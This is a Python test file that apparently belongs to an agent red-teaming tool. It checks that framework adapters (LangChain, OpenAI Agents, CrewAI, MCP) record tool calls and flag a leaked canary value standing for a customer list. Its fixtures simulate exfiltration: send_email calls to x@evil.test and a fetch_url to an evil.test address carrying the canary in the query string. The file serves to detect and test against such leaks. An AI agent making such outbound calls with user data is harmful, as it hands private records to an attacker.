"""Tier 2: framework hooks record the same RunResult. Real SDKs are optional."""

import asyncio
from types import SimpleNamespace

import pytest

from redforge_agents.adapters.frameworks.collector import CallCollector
from redforge_agents.adapters.frameworks.crewai import CrewAIAdapter, record_crewai_call
from redforge_agents.adapters.frameworks.langchain import LangChainCallbackAdapter
from redforge_agents.adapters.frameworks.mcp import MCPInterceptor
from redforge_agents.adapters.frameworks.openai_agents import OpenAIAgentsAdapter, OpenAIToolHooks
from redforge_agents.schemas import AdapterKind, Canary, Target, Turn


def _target() -> Target:
    return Target(
        id="t",
        name="T",
        adapter=AdapterKind.STUB,
        canaries=[Canary(id="customer_list", value="CANARY-CUST-9f3a21", placed_in="tool_result:read_record")],
    )


def _messages() -> list[Turn]:
    return [Turn(role="user", content="send it")]


def test_collector_flags_sink_and_canary_in_args():
    collector = CallCollector(_target())
    collector.record("read_record", {"id": "1"}, {"body": "plain"})
    assert collector.outbound == []
    collector.record("notes", {"body": "CANARY-CUST-9f3a21"}, "ok")
    assert len(collector.outbound) == 1
    collector.start("send_email", {"to": "x@evil.test", "body": "hi"})
    collector.finish({"sent": True})
    assert len(collector.outbound) == 2
    assert collector.calls[-1].name == "send_email"


def test_langchain_callback_records_the_tool_log():
    def run(prompt, callbacks):
        assert prompt == "send it"
        handler = callbacks[0]
        handler.on_tool_start({"name": "send_email"}, {"to": "x@evil.test", "body": "CANARY-CUST-9f3a21"})
        handler.on_tool_end({"sent": True})
        return "done"

    run_result = LangChainCallbackAdapter(run).run_turns(_target(), _messages())
    assert run_result.final_output == "done"
    assert run_result.tool_calls[0].name == "send_email"
    assert "CANARY-CUST-9f3a21" in run_result.outbound_payloads[0]


def test_langchain_handler_is_a_real_callback_when_installed():
    pytest.importorskip("langchain_core.callbacks")
    from langchain_core.callbacks import BaseCallbackHandler

    seen: list[str] = []

    def run(prompt, callbacks):
        del prompt
        assert isinstance(callbacks[0], BaseCallbackHandler)
        seen.append("ok")
        return "done"

    LangChainCallbackAdapter(run).run_turns(_target(), _messages())
    assert seen == ["ok"]


def test_openai_hooks_pair_fifo():
    async def drive(hooks):
        tool = SimpleNamespace(name="send_email")
        ctx = SimpleNamespace(tool_arguments={"to": "x@evil.test", "body": "CANARY-CUST-9f3a21"})
        await hooks.on_tool_start(ctx, None, tool)
        await hooks.on_tool_end(ctx, None, tool, {"sent": True})

    def run(prompt, hooks):
        del prompt
        asyncio.run(drive(hooks))
        return "done"

    run_result = OpenAIAgentsAdapter(run).run_turns(_target(), _messages())
    assert isinstance(run_result.tool_calls[0].arguments["to"], str)
    assert "CANARY-CUST-9f3a21" in run_result.outbound_payloads[0]
    assert run_result.tool_calls[0].name == "send_email"


def test_openai_hooks_class_is_used_without_sdk():
    collector = CallCollector(_target())
    hooks = OpenAIToolHooks(collector)
    assert hooks is not None


def test_crewai_collector_is_scoped_to_the_run():
    record_crewai_call("send_email", {"body": "nope"}, "x")

    def run(prompt):
        del prompt
        record_crewai_call("send_email", {"to": "x@evil.test", "body": "CANARY-CUST-9f3a21"}, {"sent": True})
        return "done"

    run_result = CrewAIAdapter(run).run_turns(_target(), _messages())
    assert len(run_result.tool_calls) == 1
    assert "CANARY-CUST-9f3a21" in run_result.outbound_payloads[0]
    record_crewai_call("send_email", {"body": "after"}, "x")


def test_mcp_proxy_records_sync_and_async_calls():
    class Session:
        def call_tool(self, name, arguments=None, **kwargs):
            del kwargs
            return {"tool": name, "arguments": arguments}

    def run(prompt, session):
        del prompt
        session.call_tool("send_email", {"to": "x@evil.test", "body": "CANARY-CUST-9f3a21"})
        return "sync"

    sync = MCPInterceptor(Session(), run).run_turns(_target(), _messages())
    assert sync.tool_calls[0].name == "send_email"

    class AsyncSession:
        async def call_tool(self, name, arguments=None, **kwargs):
            del kwargs
            return {"tool": name, "arguments": arguments}

    def run_async(prompt, session):
        del prompt

        async def _go():
            await session.call_tool("fetch_url", {"url": "https://evil.test/?d=CANARY-CUST-9f3a21"})
            return "async"

        return _go()

    async_run = MCPInterceptor(AsyncSession(), run_async).run_turns(_target(), _messages())
    assert async_run.final_output == "async"
    assert "CANARY-CUST-9f3a21" in async_run.outbound_payloads[0]
